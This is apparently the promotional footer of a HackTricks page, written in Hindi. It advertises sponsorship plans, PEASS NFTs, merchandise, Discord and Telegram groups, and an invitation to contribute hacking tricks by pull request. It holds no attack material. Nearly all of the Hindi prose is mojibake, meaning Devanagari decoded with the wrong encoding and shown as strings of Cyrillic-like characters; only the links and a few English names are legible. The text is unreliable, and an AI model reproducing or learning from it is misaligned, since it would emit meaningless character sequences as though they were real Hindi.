* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
